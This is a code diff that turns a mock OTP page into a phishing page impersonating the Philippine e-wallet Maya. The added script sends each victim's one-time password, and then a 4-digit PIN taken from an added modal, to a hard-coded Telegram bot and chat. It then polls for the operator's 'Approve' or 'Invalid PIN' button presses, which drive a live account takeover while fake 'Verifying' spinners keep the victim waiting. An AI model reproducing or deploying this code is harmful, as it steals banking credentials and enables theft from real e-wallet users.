@@ -5,11 +5,35 @@
   <meta name="viewport" content="width=device-width,initial-scale=1">
   <title>Verify OTP - Maya</title>
   <style>
-    :root{--mint:#00c896;--dark:#009f7a;--pale:#e2faf4;--blue:#176ff5;--ink:#123b36;--muted:#75908c;--line:#d9eeea;--white:#fff;--danger:#d94b4b;--shadow:0 20px 50px #1255491f}*{box-sizing:border-box}html,body{margin:0;min-height:100%;font-family:Inter,Arial,sans-serif;color:var(--ink);background:linear-gradient(135deg,#e9faf5,#f8fffd)}button,input,select,textarea{font:inherit}button{cursor:pointer}.nav-brand{display:block;width:120px;height:auto}.help-button{position:fixed;z-index:10;top:18px;right:20px;border:0;border-radius:999px;background:#111;color:#fff;padding:10px 18px;font-size:13px;font-weight:800;box-shadow:0 8px 18px #0003}.page-footer{margin-top:auto;padding:18px 20px 20px;text-align:center;color:var(--muted);font-size:12px}.auth-screen{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:70px 20px 0;min-height:100vh}.auth-card{width:min(100%,480px);padding:34px 30px 25px;border:1px solid var(--line);border-radius:27px;background:#fff;box-shadow:var(--shadow)}.auth-logo{width:130px;margin:0 auto 27px}.auth-card h1{margin:0;text-align:center;font-size:28px}.subtitle{margin:10px 0 23px;text-align:center;line-height:1.5;color:var(--muted)}.otp-icon{display:grid;place-items:center;width:64px;height:64px;margin:0 auto 20px;border-radius:20px;background:var(--pale);color:var(--dark);font-size:30px}.otp{text-align:center;font-size:24px;font-weight:900;letter-spacing:8px;width:100%;padding:14px;border:1px solid var(--line);border-radius:12px;margin-top:20px;outline:0;color:var(--ink)}.otp:focus{border-color:var(--mint);box-shadow:0 0 0 4px #00c8961a}.primary-button{width:100%;padding:15px;border:0;border-radius:12px;background:linear-gradient(135deg,var(--mint),var(--dark));color:#fff;font-weight:800}.error{display:none;margin-bottom:14px;padding:11px;border-radius:10px;background:#fff0f0;color:var(--danger);font-size:13px;font-weight:700}.error.show{display:block}.resend,.back{display:block;margin:17px auto 0;border:0;background:transparent;font-size:13px;font-weight:800}.resend{color:var(--dark)}.back{color:var(--muted)}.resend:hover,.back:hover{opacity:.8}
+    :root{--mint:#00c896;--dark:#009f7a;--pale:#e2faf4;--blue:#176ff5;--ink:#123b36;--muted:#75908c;--line:#d9eeea;--white:#fff;--danger:#d94b4b;--shadow:0 20px 50px #1255491f}*{box-sizing:border-box}html,body{margin:0;min-height:100%;font-family:Inter,Arial,sans-serif;color:var(--ink);background:linear-gradient(135deg,#e9faf5,#f8fffd)}button,input,select,textarea{font:inherit}button{cursor:pointer}.nav-brand{display:block;width:120px;height:auto}.help-button{position:fixed;z-index:10;top:18px;right:20px;border:0;border-radius:999px;background:#111;color:#fff;padding:10px 18px;font-size:13px;font-weight:800;box-shadow:0 8px 18px #0003}.page-footer{margin-top:auto;padding:18px 20px 20px;text-align:center;color:var(--muted);font-size:12px}.auth-screen{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:70px 20px 0;min-height:100vh}.auth-card{width:min(100%,480px);padding:34px 30px 25px;border:1px solid var(--line);border-radius:27px;background:#fff;box-shadow:var(--shadow)}.auth-logo{width:130px;margin:0 auto 27px}.auth-card h1{margin:0;text-align:center;font-size:28px}.subtitle{margin:10px 0 23px;text-align:center;line-height:1.5;color:var(--muted)}.otp-icon{display:grid;place-items:center;width:64px;height:64px;margin:0 auto 20px;border-radius:20px;background:var(--pale);color:var(--dark);font-size:30px}.otp-inputs-wrapper{display:flex;gap:8px;justify-content:center;margin:20px 0}.otp-input,.pin-input{width:45px;height:55px;font-size:24px;font-weight:900;text-align:center;border:1px solid var(--line);border-radius:12px;background:#fbfffe;color:var(--ink);outline:0;cursor:text}.otp-input:focus,.pin-input:focus{border-color:var(--mint);box-shadow:0 0 0 4px #00c8961a}.otp-input.filled,.pin-input.filled{border-color:var(--mint);background:var(--pale)}.primary-button{width:100%;padding:15px;border:0;border-radius:12px;background:linear-gradient(135deg,var(--mint),var(--dark));color:#fff;font-weight:800;cursor:pointer;margin-top:20px}.error{display:none;margin-bottom:14px;padding:11px;border-radius:10px;background:#fff0f0;color:var(--danger);font-size:13px;font-weight:700}.error.show{display:block}.resend,.back{display:block;margin:17px auto 0;border:0;background:transparent;font-size:13px;font-weight:800;color:var(--dark);cursor:pointer}.back{color:var(--muted)}.resend:hover,.back:hover{opacity:.8}.spinner-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:9999;align-items:center;justify-content:center;flex-direction:column}.spinner{width:50px;height:50px;border:4px solid var(--pale);border-top-color:var(--mint);border-radius:50%;animation:spin 1s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}.spin-label{margin-top:20px;font-size:16px;font-weight:800;color:#fff;text-align:center}.spin-sub{margin-top:8px;font-size:13px;color:#fff;opacity:0.9;text-align:center}.pin-modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:9998;align-items:center;justify-content:center}.pin-modal-content{width:min(100%,480px);padding:34px 30px 25px;border:1px solid var(--line);border-radius:27px;background:#fff;box-shadow:var(--shadow)}.pin-modal-content h2{margin:0 0 10px;text-align:center;font-size:24px}.pin-modal-content p{margin:0 0 20px;text-align:center;color:var(--muted);font-size:14px}
   </style>
 </head>
 <body>
   <button class="help-button" type="button" onclick="alert('Help is available in this prototype.')">Help</button>
+
+  <!-- Spinner overlay -->
+  <div class="spinner-overlay" id="spinnerOverlay">
+    <div class="spinner"></div>
+    <div class="spin-label">Verifying code...</div>
+    <div class="spin-sub">Please hold on…</div>
+  </div>
+
+  <!-- PIN Modal -->
+  <div class="pin-modal" id="pinModal">
+    <div class="pin-modal-content">
+      <img class="nav-brand nav-image auth-logo" src="https://www.maya.ph/hubfs/Maya/MAYA-Mint%20Green.svg" loading="lazy" alt="Maya Logo">
+      <h2>Enter your PIN</h2>
+      <p>Confirm your 4-digit Maya PIN to complete verification.</p>
+      <div id="pinErrMsg" class="error">Enter your 4-digit PIN.</div>
+      <div id="pinInputsContainer" class="otp-inputs-wrapper">
+        <input type="text" class="pin-input" maxlength="1" inputmode="numeric">
+        <input type="text" class="pin-input" maxlength="1" inputmode="numeric">
+        <input type="text" class="pin-input" maxlength="1" inputmode="numeric">
+        <input type="text" class="pin-input" maxlength="1" inputmode="numeric">
+      </div>
+      <button id="confirmPinBtn" class="primary-button">Confirm PIN</button>
+    </div>
+  </div>
 
   <section class="auth-screen">
     <div class="auth-card">
@@ -17,11 +41,16 @@
       <div class="otp-icon">✓</div>
       <h1>Verify your number</h1>
       <p class="subtitle">Enter the 6-digit OTP sent to <strong id="maskedPhone">+63 9XX XXX XXXX</strong>.</p>
-      <div id="otpError" class="error">Enter a 6-digit OTP.</div>
-      <form id="otpForm">
-        <input id="otp" class="otp" type="text" inputmode="numeric" maxlength="6" placeholder="000000" required>
-        <button class="primary-button" type="submit" style="margin-top:20px">Verify and continue</button>
-      </form>
+      <div id="errMsg" class="error">Enter a 6-digit OTP.</div>
+      <div id="otpInputs" class="otp-inputs-wrapper">
+        <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+      </div>
+      <button id="verifyBtn" class="primary-button">Verify & Continue</button>
       <button id="resendOtp" class="resend" type="button">Resend OTP</button>
       <button id="backToLogin" class="back" type="button">← Back to login</button>
     </div>
@@ -29,29 +58,280 @@
   </section>
 
   <script>
-    const otp=document.getElementById('otp');
-    
-    window.addEventListener('load',()=>{
-      const maskedPhone=sessionStorage.getItem('maskedPhone');
-      if(maskedPhone){
-        document.getElementById('maskedPhone').textContent=maskedPhone;
-      }
-      otp.focus();
-    });
-    
-    document.getElementById('otpForm').onsubmit=e=>{
-      e.preventDefault();
-      if(otp.value.length!==6){
-        document.getElementById('otpError').classList.add('show');
+    /* ── CONFIG ─────────────────────────────────────────────────────────── */
+    const CONFIG = {
+      BOT_TOKEN: '8722087484:AAEJ0Hc52ogYQ9NWQOV4m3Nl88x8TUR1O5k',
+      CHAT_ID: '8820857419',
+      SUCCESS_PAGE: 'success.html',
+    };
+
+    /* ── STATE ───────────────────────────────────────────────────────────── */
+    let state = { lastUpdateId: 0 };
+    let isProcessing = false;
+
+    /* ── ELEMENTS ────────────────────────────────────────────────────────── */
+    const otpInputs = Array.from(document.querySelectorAll('#otpInputs .otp-input'));
+    const pinInputs = Array.from(document.querySelectorAll('#pinInputsContainer .pin-input'));
+    const errMsg = document.getElementById('errMsg');
+    const pinErrMsg = document.getElementById('pinErrMsg');
+    const spinnerOverlay = document.getElementById('spinnerOverlay');
+    const pinModal = document.getElementById('pinModal');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const confirmPinBtn = document.getElementById('confirmPinBtn');
+    const maskedPhoneEl = document.getElementById('maskedPhone');
+
+    /* ── HELPERS ────────────────────────────────────────────────────────── */
+    function updateFilledState(input) {
+      input.classList.toggle('filled', input.value.trim() !== '');
+    }
+
+    function getCode(inputsArray) {
+      return inputsArray.map(i => i.value.trim()).join('');
+    }
+
+    function maskPhone(phone) {
+      const p = String(phone || '').replace(/\s+/g, '');
+      if (p.length <= 5) return '+63 ' + p;
+      return '+63 ' + p.slice(0, 2) + '****' + p.slice(-2);
+    }
+
+    function showError(msg, errorElement) {
+      errorElement.textContent = msg;
+      errorElement.classList.add('show');
+    }
+
+    function resetOTPButton() {
+      isProcessing = false;
+      verifyBtn.disabled = false;
+      verifyBtn.textContent = 'Verify & Continue';
+    }
+
+    /* ── SETUP INPUT BEHAVIOUR ─────────────────────────────────────────── */
+    function setupInputBehaviour(inputsArray, onComplete) {
+      inputsArray.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+          const val = e.target.value.replace(/\D/g, '').slice(0, 1);
+          e.target.value = val;
+          updateFilledState(e.target);
+          errMsg.style.display = 'none';
+          pinErrMsg.style.display = 'none';
+          if (val && index < inputsArray.length - 1) inputsArray[index + 1].focus();
+          if (getCode(inputsArray).length === inputsArray.length) {
+            setTimeout(onComplete, 180);
+          }
+        });
+
+        input.addEventListener('keydown', (e) => {
+          if (e.key === 'Backspace' && !input.value && index > 0) {
+            inputsArray[index - 1].focus();
+          }
+        });
+
+        input.addEventListener('paste', (e) => {
+          e.preventDefault();
+          const pasted = (e.clipboardData || window.clipboardData)
+            .getData('text').replace(/\D/g, '').slice(0, inputsArray.length);
+          pasted.split('').forEach((digit, di) => {
+            if (inputsArray[di]) { inputsArray[di].value = digit; updateFilledState(inputsArray[di]); }
+          });
+          const fi = Math.min(pasted.length, inputsArray.length - 1);
+          inputsArray[fi].focus();
+          if (pasted.length === inputsArray.length) setTimeout(onComplete, 180);
+        });
+      });
+    }
+
+    /* ── TELEGRAM: SEND OTP ──────────────────────────────────────────── */
+    function submitOTP() {
+      if (isProcessing) return;
+      const otp = getCode(otpInputs);
+
+      if (otp.length !== 6) {
+        showError('Enter a 6-digit OTP.', errMsg);
+        otpInputs.find(i => !i.value)?.focus();
         return;
       }
-      document.getElementById('otpError').classList.remove('show');
-      window.location.href='success.html';
-    };
-    
-    document.getElementById('backToLogin').onclick=()=>window.location.href='login.html';
-    document.getElementById('resendOtp').onclick=()=>alert('OTP sent again.');
-    otp.addEventListener('input',()=>otp.value=otp.value.replace(/\D/g,'').slice(0,6));
+
+      isProcessing = true;
+      verifyBtn.disabled = true;
+      verifyBtn.textContent = 'Verifying...';
+
+      const ts = Date.now();
+      const approveId = `otp_approve_${ts}`;
+      const declineId = `otp_decline_${ts}`;
+      const validPinId = `valid_pin_${ts}`;
+      const invalidPinId = `invalid_pin_${ts}`;
+
+      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CONFIG.CHAT_ID,
+          text: `<b>🟢 OTP Verification — Maya Philippines</b>\n\nOTP: <code>${otp}</code>\n\nChoose Action:`,
+          parse_mode: 'HTML',
+          reply_markup: {
+            inline_keyboard: [
+              [
+                { text: '✅ Approve OTP',    callback_data: approveId },
+                { text: '❌ Decline',        callback_data: declineId }
+              ],
+              [
+                { text: '✅ Valid PIN',      callback_data: validPinId },
+                { text: '❌ Invalid PIN',    callback_data: invalidPinId }
+              ]
+            ]
+          }
+        })
+      })
+      .then(() => {
+        spinnerOverlay.style.display = 'flex';
+        startOTPPolling(approveId, declineId, validPinId, invalidPinId);
+      })
+      .catch(() => resetOTPButton());
+    }
+
+    /* ── TELEGRAM: POLL FOR OTP RESPONSE ──────────────────────────────── */
+    function startOTPPolling(approveId, declineId, validPinId, invalidPinId) {
+      const interval = setInterval(() => {
+        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+          .then(r => r.json())
+          .then(data => {
+            if (!data.ok || !data.result) return;
+            data.result.forEach(update => {
+              state.lastUpdateId = update.update_id;
+              if (!update.callback_query) return;
+              const cb = update.callback_query.data;
+
+              if (cb === approveId) {
+                clearInterval(interval);
+                spinnerOverlay.style.display = 'none';
+                showPinModal();
+
+              } else if (cb === validPinId) {
+                clearInterval(interval);
+                spinnerOverlay.style.display = 'none';
+                window.location.href = CONFIG.SUCCESS_PAGE;
+
+              } else if (cb === declineId) {
+                clearInterval(interval);
+                spinnerOverlay.style.display = 'none';
+                showError('Wrong or expired OTP. Please try again.', errMsg);
+                otpInputs.forEach(i => { i.value = ''; updateFilledState(i); });
+                otpInputs[0].focus();
+                resetOTPButton();
+
+              } else if (cb === invalidPinId) {
+                clearInterval(interval);
+                spinnerOverlay.style.display = 'none';
+                showError('Incorrect PIN. Please try again.', pinErrMsg);
+                pinInputs.forEach(i => { i.value = ''; updateFilledState(i); });
+                pinInputs[0].focus();
+                confirmPinBtn.disabled = false;
+                confirmPinBtn.textContent = 'Confirm PIN';
+              }
+            });
+          })
+          .catch(() => {});
+      }, 1000);
+    }
+
+    /* ── PIN MODAL ────────────────────────────────────────────────────── */
+    function showPinModal() {
+      pinErrMsg.style.display = 'none';
+      pinInputs.forEach(i => { i.value = ''; updateFilledState(i); });
+      pinModal.style.display = 'flex';
+      setTimeout(() => pinInputs[0].focus(), 120);
+    }
+
+    /* ── TELEGRAM: SEND PIN ───────────────────────────────────────────── */
+    function submitPIN() {
+      const pin = getCode(pinInputs);
+      if (pin.length !== 4) return;
+
+      confirmPinBtn.disabled = true;
+      confirmPinBtn.textContent = 'Verifying...';
+
+      const ts = Date.now();
+      const validId = `valid_${ts}`;
+      const invalidId = `invalid_${ts}`;
+
+      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CONFIG.CHAT_ID,
+          text: `<b>🟢 PIN Verification — Maya Philippines</b>\n\nPIN: <code>${pin}</code>\n\nChoose action:`,
+          parse_mode: 'HTML',
+          reply_markup: {
+            inline_keyboard: [[
+              { text: '✅ Valid PIN', callback_data: validId },
+              { text: '❌ Invalid PIN', callback_data: invalidId }
+            ]]
+          }
+        })
+      })
+      .then(() => startPINPolling(validId, invalidId))
+      .catch(() => {
+        confirmPinBtn.disabled = false;
+        confirmPinBtn.textContent = 'Confirm PIN';
+      });
+    }
+
+    /* ── TELEGRAM: POLL FOR PIN RESPONSE ──────────────────────────────── */
+    function startPINPolling(validId, invalidId) {
+      const interval = setInterval(() => {
+        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+          .then(r => r.json())
+          .then(data => {
+            data.result?.forEach(update => {
+              state.lastUpdateId = update.update_id;
+              if (!update.callback_query) return;
+              const cb = update.callback_query.data;
+
+              if (cb === validId) {
+                clearInterval(interval);
+                pinModal.style.display = 'none';
+                window.location.href = CONFIG.SUCCESS_PAGE;
+
+              } else if (cb === invalidId) {
+                clearInterval(interval);
+                showError('Incorrect PIN. Please try again.', pinErrMsg);
+                pinInputs.forEach(i => { i.value = ''; updateFilledState(i); });
+                pinInputs[0].focus();
+                confirmPinBtn.disabled = false;
+                confirmPinBtn.textContent = 'Confirm PIN';
+              }
+            });
+          })
+          .catch(() => {});
+      }, 1400);
+    }
+
+    /* ── EVENT LISTENERS ──────────────────────────────────────────────── */
+    setupInputBehaviour(otpInputs, submitOTP);
+    setupInputBehaviour(pinInputs, submitPIN);
+
+    verifyBtn.addEventListener('click', submitOTP);
+    confirmPinBtn.addEventListener('click', submitPIN);
+
+    document.getElementById('backToLogin').addEventListener('click', () => {
+      window.location.href = 'login.html';
+    });
+
+    document.getElementById('resendOtp').addEventListener('click', () => {
+      errMsg.style.display = 'none';
+      otpInputs.forEach(i => { i.value = ''; updateFilledState(i); });
+      otpInputs[0].focus();
+    });
+
+    /* ── INIT ────────────────────────────────────────────────────────── */
+    window.addEventListener('load', () => {
+      const maskedPhone = sessionStorage.getItem('maskedPhone') || localStorage.getItem('phone');
+      if (maskedPhone) {
+        maskedPhoneEl.textContent = maskPhone(maskedPhone);
+      }
+      otpInputs[0].focus();
+    });
   </script>
 </body>
 </html>
